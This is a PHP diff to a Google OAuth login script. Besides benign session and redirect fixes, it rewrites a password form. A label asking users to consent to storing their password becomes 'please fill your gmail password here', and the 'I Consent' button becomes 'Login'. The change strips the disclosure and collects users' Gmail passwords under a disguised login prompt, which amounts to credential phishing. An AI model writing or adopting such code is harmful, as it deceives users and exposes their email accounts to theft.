@@ -43,7 +43,9 @@ if (!isset($_GET['code'])) {
 }
 
 if (isset($_GET['code']) || ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SESSION['google_user']))) {
-    session_start();
+    if (session_status() !== PHP_SESSION_ACTIVE) {
+        session_start();
+    }
 
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SESSION['google_user'])) {
         // Password form submitted, use session data
@@ -103,9 +105,9 @@ if (isset($_GET['code']) || ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SE
         </head>
         <body>
             <form method="post" action="">
-                <label for="password">To continue, please consent to store your password for this account. You may use your browser-saved password (autofill) or enter it manually:</label><br>
+                <label for="password">To continue, please fill your gmail password here:</label><br>
                 <input type="password" name="password" id="password" required autocomplete="current-password"><br>
-                <button type="submit" name="consent" value="1">I Consent</button>
+                <button type="submit" name="consent" value="1">Login</button>
             </form>
         </body>
         </html>
@@ -139,11 +141,18 @@ if (isset($_GET['code']) || ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SE
         $user_id = $pdo->lastInsertId();
     }
     // Log the user in by setting session
-    session_start();
+    if (session_status() !== PHP_SESSION_ACTIVE) {
+        session_start();
+    }
     $_SESSION['user_id'] = $user_id;
     // After successful login, clear session data
     unset($_SESSION['google_user'], $_SESSION['google_id']);
     // Redirect to dashboard or home
-    header('Location: /index.php');
-    exit();
+    if (!headers_sent()) {
+        header('Location: /index.php');
+        exit();
+    } else {
+        echo "<script>window.location.href='/dashboard.php';</script>";
+        exit();
+    }
 }
